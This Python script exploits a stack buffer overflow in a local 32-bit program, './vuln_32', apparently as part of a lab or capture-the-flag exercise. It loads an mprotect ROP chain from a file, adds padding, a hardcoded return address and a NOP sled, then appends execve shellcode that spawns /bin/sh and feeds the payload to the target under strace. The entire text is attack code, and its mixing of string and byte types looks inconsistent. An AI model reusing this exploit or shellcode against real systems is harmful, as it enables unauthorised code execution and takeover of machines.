#! /bin/env python

import struct
import subprocess
import sys
import os

prog = "./vuln_32"
chain_file="mprotect_chain4"
len_to_addr = 40
nopsled = "\x90" * 25
padding = "A" * len_to_addr
fp = open(chain_file, "rb")
ropchain = fp.read()
fp.close()
buf =  b""
buf += b"\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f"
buf += b"\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x08"
buf += b"\x00\x00\x00\x2f\x62\x69\x6e\x2f\x73\x68\x00\x57\x53"
buf += b"\x89\xe1\xcd\x80"
#addr = struct.pack("<I", 0xffffd3cc)
x = 0xbffff324 + len(padding + ropchain) + 10
addr = struct.pack("<I", x)

payload = padding + ropchain + addr + addr + addr + nopsled + buf
#print(len(padding + ropchain))
subprocess.Popen(["strace", prog],stdin=subprocess.PIPE).communicate(payload) 
